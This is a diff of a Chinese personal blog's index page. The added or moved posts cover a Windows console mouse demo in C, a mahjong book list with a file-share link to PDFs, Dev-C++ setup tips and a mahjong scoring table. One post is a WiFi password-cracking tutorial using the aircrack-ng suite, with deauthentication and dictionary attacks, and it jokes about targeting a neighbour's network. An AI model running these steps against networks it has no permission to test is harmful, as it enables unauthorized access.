+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>  </span>
+<span class="hljs-function"></span>&#123;  
+	<span class="hljs-comment">// 获取标准输入输出设备句柄  </span>
+	HANDLE hOut = <span class="hljs-built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);        
+	HANDLE hIn = <span class="hljs-built_in">GetStdHandle</span>(STD_INPUT_HANDLE); 
+	CONSOLE_SCREEN_BUFFER_INFO bInfo;
+	INPUT_RECORD	mouseRec;
+	DWORD			res;
+	COORD			crPos, crHome = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[Cursor Position] X: %2lu  Y: %2lu\n&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);	<span class="hljs-comment">// 初始状态</span>
+	<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)
+	&#123;
+		<span class="hljs-built_in">ReadConsoleInput</span>(hIn, &amp;mouseRec, <span class="hljs-number">1</span>, &amp;res);
+ 
+		<span class="hljs-keyword">if</span> (mouseRec.EventType == MOUSE_EVENT)
+		&#123;
+			<span class="hljs-keyword">if</span> (mouseRec.Event.MouseEvent.dwButtonState==FROM_LEFT_1ST_BUTTON_PRESSED)
+			&#123;
+				<span class="hljs-keyword">if</span> (mouseRec.Event.MouseEvent.dwEventFlags == DOUBLE_CLICK)
+				&#123;
+					<span class="hljs-keyword">break</span>;	<span class="hljs-comment">// 左键双击 退出循环</span>
+				&#125;
+			&#125;			
+			crPos = mouseRec.Event.MouseEvent.dwMousePosition;
+			<span class="hljs-built_in">GetConsoleScreenBufferInfo</span>(hOut, &amp;bInfo);
+			<span class="hljs-built_in">SetConsoleCursorPosition</span>(hOut, crHome);
+			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[Cursor Position] X: %2lu  Y: %2lu&quot;</span>, crPos.X, crPos.Y);
+			<span class="hljs-built_in">SetConsoleCursorPosition</span>(hOut, bInfo.dwCursorPosition);
+			<span class="hljs-keyword">switch</span> (mouseRec.Event.MouseEvent.dwButtonState)
+			&#123;
+				<span class="hljs-keyword">case</span> FROM_LEFT_1ST_BUTTON_PRESSED:			<span class="hljs-comment">// 左键 输出A</span>
+					<span class="hljs-built_in">FillConsoleOutputCharacter</span>(hOut, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">1</span>, crPos, &amp;res);
+					<span class="hljs-keyword">break</span>;		<span class="hljs-comment">// 如果使用printf输出，则之前需要先设置光标的位置</span>
+ 	
+				<span class="hljs-keyword">case</span> RIGHTMOST_BUTTON_PRESSED:				<span class="hljs-comment">// 右键 输出a</span>
+					<span class="hljs-built_in">FillConsoleOutputCharacter</span>(hOut, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">1</span>, crPos, &amp;res);
+					<span class="hljs-keyword">break</span>;
+	 
+				<span class="hljs-keyword">default</span>:
+					<span class="hljs-keyword">break</span>;
+			&#125;
+		&#125;		
+	&#125;
+	<span class="hljs-built_in">CloseHandle</span>(hOut);  <span class="hljs-comment">// 关闭标准输出设备句柄  </span>
+	<span class="hljs-built_in">CloseHandle</span>(hIn);   <span class="hljs-comment">// 关闭标准输入设备句柄  </span>
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
+&#125;</code></pre>
+		
+	</div>
+	
+	<div class="post shadow">
+		<h1 class="postTitle">
+			<a href="/2023/07/06/日本麻将资料整理/">
+				日本麻将资料整理
+			</a>
+		</h1>
+		<div class="postInfo">
+			2023-07-06
+		</div>
+		
+		<p><strong>书名一览（为保证浏览体验，请关闭翻译）</strong></p>
+<blockquote>
+<p>《ASAPIN 天才雀士に麻雀のことを聞いたらバカ勝ちできた》<br>《Guzaku 傑作「何切る」300選》<br>《Guzaku 定石「何切る」301選》<br>《owata 三人麻雀の極意》<br>《ZERO ゼロ秒思考の麻雀》<br>《ZERO 麻雀強者の0秒思考》<br>《かにマジン 日本一麻雀が強いサラリーマンの必勝法》<br>《きよ アマチュア地方最強位が作る新麻雀マニュアル》<br>《みーにん 「統計学」のマージャン戦術》<br>《みーにん 知るだけで強くなる麻雀の2択》<br>《ゆうせー 実戦でよく出る!麻雀講義》<br>《中島準也 理論的思考で勝つ麻雀》<br>《二階堂亜樹 勝てる麻雀の基本》<br>《土井泰昭 勝つ人は知っている現代麻雀30の新常識》<br>《土田浩翔 運を育てる》<br>《堀内正人 麻雀の麒麟児の一打》<br>《堀慎吾 麻雀だから君は負けるんです》<br>《多井隆晴 多井熱》<br>《小林剛 スーパーデジタル麻雀》<br>《川村晃裕 麻雀勝ち組の鳴きテクニック》<br>《平澤元気 よくわかる麻雀の勝ち方》<br>《平澤元気 現代麻雀の秘技相手に対応させる技術》<br>《平澤元気 絶対にラスを引かない麻雀ラス回避35の技術》<br>《日本プロ麻雀連盟 麻雀基本手筋コレクション》<br>《朝倉康心 麻雀の失敗学》<br>《比嘉秀仁 強者の最近手筋100》<br>《水上直紀 麻雀AI戦術》<br>《独歩 序盤の鉄戦略》<br>《独歩 鉄押しの条件》<br>《石橋伸洋 進化するデジタル麻雀》<br>《石橋伸洋 黒いデジタル麻雀》<br>《福地誠 これだけで勝てる!麻雀の基本形80》<br>《福地誠 手作りと押し引きの鉄戦術》<br>《福地誠 麻雀10倍勝てるテクニック》<br>《福地誠 麻雀の正解》<br>《福地誠 麻雀テクニック》<br>《福地誠 麻雀勝ち組の選択》<br>《福地誠 麻雀勝ち組の選択II》<br>《菊池翔 絶対に負けない最強麻雀戦術》<br>《藤田晋 仕事が麻雀で麻雀が仕事》<br>《近代麻雀 プロに挑戦!!麻雀検定》<br>《近代麻雀 麻雀プロMリーグ選手名鑑》<br>《近藤誠一 大きく打ち大きく勝つ麻雀》<br>《鈴木たろう ゼウスの選択》<br>《馬場裕一 バビーのメンチン何切る》<br>《鳳南研究所 現代麻雀の神ワザ》</p>
+</blockquote>
+<h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p><strong>资料来源于网络</strong></p>
+<p><strong>仅供交流学习使用，不得用于任何商业用途</strong></p>
+<p><a target="_blank" rel="noopener" href="https://cowtransfer.com/s/cc797d6a256440">https://cowtransfer.com/s/cc797d6a256440</a> 点击链接查看 【 PDF.zip 】 ，或访问奶牛快传 cowtransfer.com 输入传输口令 f4jzju 查看；</p>
+
+		
+	</div>
+	
+	<div class="post shadow">
+		<h1 class="postTitle">
+			<a href="/2024/10/31/将DEV-C-编辑器打造成神级IDE及美化/">
+				将DEV-C++编辑器打造成神级IDE及美化
+			</a>
+		</h1>
+		<div class="postInfo">
+			2024-10-31
+		</div>
+		
+		<h1 id="头记"><a href="#头记" class="headerlink" title="头记"></a>头记</h1><p>鉴于使用<code>原版DEV-C++</code>不得不说十分滞后，人家<code>Visual Studio</code>多高端，本人写下此文章,使用一些奇技淫巧，美化和增强此IDE，个人认为可以和<code>Visual Studio</code>相媲美</p>
+<h1 id="样式美化"><a href="#样式美化" class="headerlink" title="样式美化"></a>样式美化</h1><p><img src="https://cdn.luogu.com.cn/upload/image_hosting/vttuwku5.png" alt="预览"></p>
+<ol>
+<li><p>点击顶部菜单栏<code>工具</code></p>
+</li>
+<li><p>点击下拉列表中的<code>编译器选项</code></p>
+</li>
+<li><p>点击新弹出的窗口中的<code>基本</code></p>
+</li>
+<li><p>取消勾选<code>高亮显示当前行</code>，或者后面你再选择你喜欢的颜色。</p>
+</li>
+<li><p>点击还是这个窗口中的<code>语法</code>（和“基本”在同一排）</p>
+</li>
+<li><p>选择<code>预设</code>为 Obsidian，保存一下再进行以下修改</p>
+</li>
+<li><p>修改以下几个地方：（都只改前景和样式，背景不改，改完记得点确定）</p>
+</li>
+</ol>
+<blockquote>
+<p>Preprocessor: （自定义）红136+绿99+蓝173+下划线</p>
+<p>Reserved Word： （自定义）红106+绿185+蓝255+下划线</p>
+<p>Identifier： Silver</p>
+<p>String：（自定义）红255+绿128+蓝128</p>
+<p>Symbol：（自定义）同上String</p>
+</blockquote>
+<h1 id="取消完成符号（个人喜好）"><a href="#取消完成符号（个人喜好）" class="headerlink" title="取消完成符号（个人喜好）"></a>取消完成符号（个人喜好）</h1><ol>
+<li><p>点击顶部菜单栏<code>工具</code>-&gt;点击<code>编译器选项</code></p>
+</li>
+<li><p>点击新弹出的窗口中的<code>代码补全</code></p>
+</li>
+<li><p>点击<code>完成符号</code></p>
+</li>
+<li><p>取消勾选<code>启用符号配对</code></p>
+</li>
+</ol>
+<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/1ijwn1cy.png"></p>
+<h1 id="编译选项优化"><a href="#编译选项优化" class="headerlink" title="编译选项优化"></a>编译选项优化</h1><ol>
+<li><p>点击顶部菜单栏<code>工具</code></p>
+</li>
+<li><p>点击下拉列表中的<code>编译选项</code></p>
+</li>
+<li><p>点击新弹出的窗口中的<code>代码生成/优化</code></p>
+</li>
+<li><p>点击<code>代码警告</code></p>
+</li>
+<li><p>设<code>显示最多警告信息（-Wall）</code>为Yes</p>
+</li>
+<li><p>(有必要的可以设“显示所有警告为错误（-Werror）”为Yes)</p>
+</li>
+</ol>
+<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/mf2j4j60.png" alt="像这样"></p>
+<h1 id="使用自己的mingw-w64"><a href="#使用自己的mingw-w64" class="headerlink" title="使用自己的mingw-w64"></a>使用自己的mingw-w64</h1><p>（Dev-C++ 5.11自带的mingw-w64的版本才4.9.2，我们可以使用自己最新版的mingw-w64，目前是8.1.0）</p>
+<ol>
+<li><p>mingw-w64的下载安装教程,在<a target="_blank" rel="noopener" href="https://www.luogu.com.cn/blog/sky-fox/post-an-li-sublime-text-3-pei-zhi-cjava-kai-fa-huan-jing">这里</a>有</p>
+</li>
+<li><p>打开Dev-C++过程中一定不要关闭</p>
+</li>
+<li><p>打开你Dev-C++安装的位置（默认在C:\Program Files (x86)\Dev-Cpp）</p>
+</li>
+<li><p>用你的MinGW64覆盖掉自带的MinGW64的文件夹</p>
+</li>
+<li><p>然后点击Dev-C++菜单栏 <code>文件</code> -&gt; <code> 编译选项</code> -&gt; 点击 <code>目录</code></p>
+</li>
+<li><p>点击<code>C包含文件</code>和<code>C++包含文件</code></p>
+</li>
+<li><p>把里面路径所有的4.9.2换成8.1.0（即你所用的版本）</p>
+</li>
+<li><p>然后重新打开Dev-C++进行配置</p>
+</li>
+</ol>
+<p>修改样例（修改后点击替换）:</p>
+<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/9ms6hwzz.png"></p>
+<p><strong>注</strong>：如果你过程中关闭了Dev-C++重新打开时他会提示你“<strong>路径无效，是否删除无效路径</strong>”请选择<strong>否</strong>，不然你的许多头文件会用不了</p>
+<p>接下来配置一下</p>
+<ul>
+<li><p>点击Dev-C++菜单栏 <code>文件</code> -&gt; <code>编译选项</code> 点击上方两个加号处</p>
+</li>
+<li><p>点击Yes或No，点击Yes就会清空原有列表，点击No就会保留原来列表，建议清空（建议点击Yes）</p>
+</li>
+<li><p>如果会生成一个新列表，说明配置成功了,像这样</p>
+</li>
+</ul>
+<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/5eebhg9a.png"><br><img src="https://cdn.luogu.com.cn/upload/image_hosting/vdtluh48.png"></p>
+<h1 id="格式化修改"><a href="#格式化修改" class="headerlink" title="格式化修改"></a>格式化修改</h1><ol>
+<li><p>点击顶部菜单栏<code>AStyle</code></p>
+</li>
+<li><p>点击下拉列表中的<code>格式化选项</code></p>
+</li>
+<li><p>选择<code>选项——括号风格</code>为Allman（个人喜欢）（默认的Java也还行）</p>
+</li>
+<li><p>在编辑代码的时候按Ctrl+Shift+A就可以自动格式化啦</p>
+</li>
+</ol>
+<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/o8x9q60g.png" alt="预览"></p>
+<h1 id="设置透明编辑器"><a href="#设置透明编辑器" class="headerlink" title="设置透明编辑器"></a>设置透明编辑器</h1><p><img src="https://cdn.luogu.com.cn/upload/image_hosting/9ztt3tra.png" alt="预览"></p>
+<ol>
+<li><p>点击<a target="_blank" rel="noopener" href="https://files.cnblogs.com/files/fox-nest/Glass2k.rar">这里</a>下载<a target="_blank" rel="noopener" href="https://files.cnblogs.com/files/fox-nest/Glass2k.rar">Glass2k程序</a></p>
+</li>
+<li><p>解压并打开<code>Glass2k.exe</code>(怎么都是英文的？！别怕)</p>
+</li>
+<li><p>如果没有显示界面那就看看任务栏右下角有没有三个箱子堆起来的图标，右键点<code>Settings</code></p>
+</li>
+<li><p>有三个勾选框，简单翻译一下，第一个是开机启动，第二个是记住透明度设置，第三个是深度使用该软件（建议勾选第二和第三个）（下面那个蓝蓝的条是用来设置任务栏的透明度的）</p>
+</li>
+<li><p>接下来为了避免鼠标按键冲突，设置<code>Right Click</code>: <code>+ Ctrl + Shift</code></p>
+</li>
+<li><p>然后打开DEV-C++，按着<code>Ctrl + Shift + 右键</code>点击DEV-C++窗口的任意地方，就会出现一个列表，选择你想要的透明度就可以啦（建议设置80%）</p>
+</li>
+</ol>
+<ul>
+<li>可以按照下图修改</li>
+</ul>
+<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/0gbn318e.png" alt="预览"></p>
+<p>（PS:这个软件也可以用在其他一些地方哦，如：浏览器，文件夹等）</p>
+<h1 id="一些快捷键"><a href="#一些快捷键" class="headerlink" title="一些快捷键"></a>一些快捷键</h1><ol>
+<li><p>f9编译，f10运行，f11编译运行（这个应该不用我多说）</p>
+</li>
+<li><p>f5调试（记得把设定编译器配置改为TDM-GCC 4.9.2 64-bit Debug），F7下一步，F8单步进入（这个应该也不用我多说）</p>
+</li>
+<li><p>Ctrl+f11全屏&#x2F;取消全屏，样例：<br><img src="https://cdn.luogu.com.cn/upload/image_hosting/xv7z3idp.png"></p>
+</li>
+<li><p>当你打开了两个文件时，让你的页面停留在一个文件，按Ctrl+M就可以把另一个文件在新的页面打开，样例:<br><img src="https://cdn.luogu.com.cn/upload/image_hosting/klowtiln.png"></p>
+</li>
+</ol>
+<h1 id="最后的一些话"><a href="#最后的一些话" class="headerlink" title="最后的一些话"></a>最后的一些话</h1><p>Dev-C++跟目前的主流代码编辑器相比已被拉开巨大的差距，但</p>
+<p><strong>文章到此就结束了，还在持续更新，给个赞再走呗</strong></p>
+
+		
+	</div>
+	
+	<div class="post shadow">
+		<h1 class="postTitle">
 			<a href="/2024/06/17/vim快速入门/">
 				vim快速入门
 			</a>
@@ -1998,59 +1908,90 @@ deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib
 	
 	<div class="post shadow">
 		<h1 class="postTitle">
-			<a href="/2024/07/26/kali+无线网卡破解wifi密码/">
-				kali+无线网卡破解wifi密码
+			<a href="/2024/02/08/日本麻将算符表/">
+				日本麻将算符表
 			</a>
 		</h1>
 		<div class="postInfo">
-			2024-07-26
+			2024-02-08
 		</div>
 		
-		<h1 id="材料准备"><a href="#材料准备" class="headerlink" title="材料准备"></a>材料准备</h1><ol>
-<li>安装有kali虚拟机的电脑，最好别用wsl（会有一些莫名其妙的错误）</li>
-<li>无线网卡一枚（最好免驱），网购约30元，我使用的是mt7601u</li>
-<li>字典（自己生成或者网上下载如Top100）</li>
-<li><del>邻居家的wifi</del></li>
-</ol>
-<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="将无线网卡连接至虚拟机"><a href="#将无线网卡连接至虚拟机" class="headerlink" title="将无线网卡连接至虚拟机"></a>将无线网卡连接至虚拟机</h2><p>请务必先打开kali虚拟机后，后将无线网卡插上电脑。</p>
-<p>这样在VMwwre中才会出现一个弹窗“检测到新的usb设备”选择“连接到虚拟机”，选中你的虚拟机点确定</p>
-<p>打开终端，输入<code>ifconfig</code>，如果列出的表中有<code>wlan0</code>，则说明无线网卡已经成功连接到kali虚拟机中</p>
-<h2 id="开启监听模式"><a href="#开启监听模式" class="headerlink" title="开启监听模式"></a>开启监听模式</h2><p>首先获取root权限</p>
-<pre><code class="hljs bash">sudo su</code></pre>
-
-<p>开启网卡监听</p>
-<pre><code class="hljs bash">airmon-ng start wlan0</code></pre>
-
-<p>查看是否监听成功</p>
-<pre><code class="hljs bash">ifconfig</code></pre>
-
-<p>扫描附近的wifi，搜索到你要破解的wifi时及时按下<code>空格</code>暂停扫描，以免扫描的东西不见了</p>
-<pre><code class="hljs bash">airodump-ng wlan0</code></pre>
-<table>
+		<blockquote>
+<p>符&#x3D;20（基底符）+各牌组的符数+和牌方式<br>个位不为0的用进一法进到十位</p>
+</blockquote>
+<h2 id="牌组的符数"><a href="#牌组的符数" class="headerlink" title="牌组的符数"></a>牌组的符数</h2><table>
 <thead>
 <tr>
-<th align="center">BSSID</th>
-<th align="center">CH</th>
-<th align="center">ESSID</th>
+<th align="center">刻子</th>
+<th align="center">暗</th>
+<th align="center">幺九</th>
+<th align="center">杠</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="center">wifi的网卡</td>
-<td align="center">信道</td>
-<td align="center">wifi的名字</td>
+<td align="center">2</td>
+<td align="center">(累乘)*2</td>
+<td align="center">(累乘)*2</td>
+<td align="center">(累乘)*4</td>
 </tr>
 </tbody></table>
-<p>查看wifi连接的设备</p>
-<pre><code class="hljs bash">airodump-ng --bssid &lt;BSSID&gt; -c &lt;CH&gt; -w &lt;文件名不用自己加后缀&gt; wlan0</code></pre>
-
-<p>抓包</p>
-<pre><code class="hljs bash">aireplay-ng -0 2 -a &lt;BSSID&gt; -c &lt;STATION&gt; wlan0</code></pre>
-<p>参数说明：-0抓取包的个数，-a路由器MAC，-c用户MAC</p>
-<p>破解wifi密码，跑包，如果密码字典中有密码，即可破解成功</p>
-<pre><code class="hljs bash">aircrack-ng -w &lt;字典路径&gt; &lt;文件名不用自己加后缀&gt;</code></pre>
-
-<p>停止监听</p>
-<pre><code class="hljs bash">airmon stop wlan0</code></pre>
+<table>
+<thead>
+<tr>
+<th align="center">雀头</th>
+<th align="center">顺子</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">2*番数</td>
+<td align="center">0</td>
+</tr>
+</tbody></table>
+<h2 id="和牌方式"><a href="#和牌方式" class="headerlink" title="和牌方式"></a>和牌方式</h2><table>
+<thead>
+<tr>
+<th align="center">门清前放铳</th>
+<th align="center">自摸</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">10</td>
+<td align="center">2</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">平和自摸</th>
+<th align="center">平和放铳</th>
+<th align="center">特殊牌型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">20（固定）</td>
+<td align="center">30（固定）</td>
+<td align="center">25（固定）</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">边张（单骑）</th>
+<th align="center">嵌张（单骑）</th>
+<th align="center">雀头（单骑）</th>
+<th align="center">双碰（非单骑）</th>
+<th align="center">两面（非单骑）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">2</td>
+<td align="center">2</td>
+<td align="center">2</td>
+<td align="center">0</td>
+<td align="center">0</td>
+</tr>
+</tbody></table>
+<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p><a target="_blank" rel="noopener" href="https://lietxia.github.io/fupractice.html">https://lietxia.github.io/fupractice.html</a></p>
 
 		
 	</div>
@@ -2205,6 +2146,79 @@ ssh-keygen -t rsa -b 4096</code></pre>
 	
 	<div class="post shadow">
 		<h1 class="postTitle">
+			<a href="/2024/07/26/kali+无线网卡破解wifi密码/">
+				kali+无线网卡破解wifi密码
+			</a>
+		</h1>
+		<div class="postInfo">
+			2024-07-26
+		</div>
+		
+		<h1 id="材料准备"><a href="#材料准备" class="headerlink" title="材料准备"></a>材料准备</h1><ol>
+<li>安装有kali虚拟机的电脑，最好别用wsl（会有一些莫名其妙的错误）</li>
+<li>无线网卡一枚（最好免驱），网购约30元，我使用的是mt7601u</li>
+<li>字典（自己生成或者网上下载如Top100）</li>
+<li><del>邻居家的wifi</del></li>
+</ol>
+<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="将无线网卡连接至虚拟机"><a href="#将无线网卡连接至虚拟机" class="headerlink" title="将无线网卡连接至虚拟机"></a>将无线网卡连接至虚拟机</h2><p>请务必先打开kali虚拟机后，后将无线网卡插上电脑。</p>
+<p>这样在VMwwre中才会出现一个弹窗“检测到新的usb设备”选择“连接到虚拟机”，选中你的虚拟机点确定</p>
+<p>打开终端，输入<code>ifconfig</code>，如果列出的表中有<code>wlan0</code>，则说明无线网卡已经成功连接到kali虚拟机中</p>
+<h2 id="开启监听模式"><a href="#开启监听模式" class="headerlink" title="开启监听模式"></a>开启监听模式</h2><p>首先获取root权限</p>
+<pre><code class="hljs bash">sudo su</code></pre>
+
+<p>开启网卡监听</p>
+<pre><code class="hljs bash">airmon-ng start wlan0</code></pre>
+
+<p>查看是否监听成功</p>
+<pre><code class="hljs bash">ifconfig</code></pre>
+
+<p>扫描附近的wifi，搜索到你要破解的wifi时及时按下<code>空格</code>暂停扫描，以免扫描的东西不见了</p>
+<pre><code class="hljs bash">airodump-ng wlan0</code></pre>
+<table>
+<thead>
+<tr>
+<th align="center">BSSID</th>
+<th align="center">CH</th>
+<th align="center">ESSID</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">wifi的网卡</td>
+<td align="center">信道</td>
+<td align="center">wifi的名字</td>
+</tr>
+</tbody></table>
+<p>查看wifi连接的设备</p>
+<pre><code class="hljs bash">airodump-ng --bssid &lt;BSSID&gt; -c &lt;CH&gt; -w &lt;文件名不用自己加后缀&gt; wlan0</code></pre>
+
+<p>抓包</p>
+<pre><code class="hljs bash">aireplay-ng -0 2 -a &lt;BSSID&gt; -c &lt;STATION&gt; wlan0</code></pre>
+<p>参数说明：-0抓取包的个数，-a路由器MAC，-c用户MAC</p>
+<p>破解wifi密码，跑包，如果密码字典中有密码，即可破解成功</p>
+<pre><code class="hljs bash">aircrack-ng -w &lt;字典路径&gt; &lt;文件名不用自己加后缀&gt;</code></pre>
+
+<p>停止监听</p>
+<pre><code class="hljs bash">airmon stop wlan0</code></pre>
+
+		
+	</div>
+	
+	<div class="post shadow">
+		<h1 class="postTitle">
+			<a href="/2024/10/31/Wolfram-Language学习/">
+				Wolfram Language学习
+			</a>
+		</h1>
+		<div class="postInfo">
+			2024-10-31
+		</div>
+		
+		
+		
+	</div>
+	
+	<div class="post shadow">
+		<h1 class="postTitle">
 			<a href="/2024/08/19/CTF常用工具下载/">
 				CTF常用工具下载
 			</a>
@@ -2301,12 +2315,26 @@ ssh-keygen -t rsa -b 4096</code></pre>
 	
 	<div class="post shadow">
 		<h1 class="postTitle">
-			<a href="/2024/10/31/Wolfram-Language学习/">
-				Wolfram Language学习
+			<a href="/2024/10/28/CTF-Pwn/">
+				CTF-Pwn
 			</a>
 		</h1>
 		<div class="postInfo">
-			2024-10-31
+			2024-10-28
+		</div>
+		
+		
+		
+	</div>
+	
+	<div class="post shadow">
+		<h1 class="postTitle">
+			<a href="/2024/10/28/CTF-Reverse/">
+				CTF-Reverse
+			</a>
+		</h1>
+		<div class="postInfo">
+			2024-10-28
 		</div>
 		
 		
@@ -2416,20 +2444,6 @@ group_concat(列名称) <span class="hljs-comment">--将一列的东西单项显
 
 <p>MD5值相同的字符串：s878926199a 和 s155964671a</p>
 
-		
-	</div>
-	
-	<div class="post shadow">
-		<h1 class="postTitle">
-			<a href="/2024/10/28/CTF-Reverse/">
-				CTF-Reverse
-			</a>
-		</h1>
-		<div class="postInfo">
-			2024-10-28
-		</div>
-		
-		
 		
 	</div>
 	
@@ -2650,20 +2664,6 @@ pkts = rdpcap(<span class="hljs-string">&quot;xxx.pcap&quot;</span>) <span class
 capture = sniff(<span class="hljs-built_in">filter</span>=<span class="hljs-string">&quot;udp&quot;</span>, count=<span class="hljs-number">5</span>)
 wrpcap(<span class="hljs-string">&quot;udp.pcap&quot;</span>, capture) <span class="hljs-comment"># 将数据包写入新的数据包</span>
 </code></pre>
-		
-	</div>
-	
-	<div class="post shadow">
-		<h1 class="postTitle">
-			<a href="/2024/10/28/CTF-Pwn/">
-				CTF-Pwn
-			</a>
-		</h1>
-		<div class="postInfo">
-			2024-10-28
-		</div>
-		
-		
 		
 	</div>
 	
